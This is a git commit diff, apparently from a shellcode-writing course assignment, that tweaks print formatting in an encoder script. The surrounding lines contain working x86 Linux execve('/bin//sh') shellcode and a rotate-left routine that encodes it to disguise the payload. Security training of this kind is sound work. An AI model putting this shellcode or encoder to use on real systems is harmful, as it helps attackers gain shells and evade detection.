baf51a5a8049457552aa86093b4c5410b483adbd
blu3gl0w13 <blu3gl0w13@gmail.com>
2016-09-06 22:13:47 -0700

    Fixed an issue with Assignment 4

--- assignment-4/encoder.py
+++ assignment-4/encoder.py
@@ -33,7 +33,6 @@ def rol(valueToBeRotated, rotateAmount):
   return ((valueToBeRotated << (rotateAmount % 8)) & 0xff) | ((valueToBeRotated & 0xff) >> (8 - (rotateAmount % 8)))
 
 
-
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
 
@@ -49,6 +48,6 @@ for i in bytearray(shellcode):
   encshellcode2 += "0x%02x," % x
 
 
-print "Encoded Shellcode: %s\n" % encshellcode
+print "\n\nEncoded Shellcode: %s" % encshellcode
 print "Encoded Shellcode 2: %s\n\n" % encshellcode2
 
